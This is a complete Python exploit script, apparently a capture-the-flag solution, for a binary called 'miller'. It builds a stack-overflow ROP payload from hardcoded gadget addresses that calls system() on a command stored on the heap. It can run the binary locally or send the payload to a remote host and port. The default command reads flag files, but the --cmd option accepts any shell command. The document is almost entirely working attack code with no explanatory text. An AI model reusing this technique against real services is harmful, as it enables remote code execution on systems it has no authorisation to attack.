#!/usr/bin/env python3
import argparse
import socket
import struct
import subprocess
import sys
from typing import Optional


# Binary gadgets / functions (no PIE)
RET = 0x401164
VULN = 0x4013A0
MOV_RDI_RAX_CALL_SYSTEM = 0x401249
MAIN_REENTRY = 0x40146F
OFFSET_TO_RIP = 0x118


def build_payload(command: str) -> bytes:
    if "\n" in command:
        command = command.replace("\n", " ")

    stage1 = (
        b"A" * OFFSET_TO_RIP
        + struct.pack("<Q", RET)
        + struct.pack("<Q", VULN)
        + struct.pack("<Q", MOV_RDI_RAX_CALL_SYSTEM)
        + struct.pack("<Q", 0x4242424242424242)
        + struct.pack("<Q", MAIN_REENTRY)
    )

    # 1st run: hit stack overflow path
    # 2nd run: select heap path and store command safely on heap
    return b"1\n" + stage1 + b"\n" + b"300\n" + command.encode() + b"\n"


def run_local(payload: bytes) -> bytes:
    proc = subprocess.run(
        ["./ld-linux-x86-64.so.2", "--library-path", ".", "./miller"],
        input=payload,
        capture_output=True,
        check=False,
    )
    return proc.stdout + proc.stderr


def recv_all(sock: socket.socket, timeout: float = 1.0) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        except TimeoutError:
            break
    return b"".join(chunks)


def run_remote(host: str, port: int, payload: bytes) -> bytes:
    with socket.create_connection((host, port), timeout=5.0) as sock:
        _ = recv_all(sock, timeout=0.4)
        sock.sendall(payload)
        return recv_all(sock, timeout=1.2)


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="Exploit for miller")
    parser.add_argument("--host", help="Remote host")
    parser.add_argument("--port", type=int, help="Remote port")
    parser.add_argument(
        "--cmd",
        default=(
            "cat flag 2>/dev/null; "
            "cat flag.txt 2>/dev/null; "
            "cat /flag 2>/dev/null; "
            "cat /home/ctf/flag 2>/dev/null; "
            "cat /home/ctf/flag.txt 2>/dev/null"
        ),
        help="Command to execute via system()",
    )
    args = parser.parse_args(argv)

    payload = build_payload(args.cmd)

    if args.host and args.port:
        out = run_remote(args.host, args.port, payload)
    else:
        out = run_local(payload)

    sys.stdout.buffer.write(out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
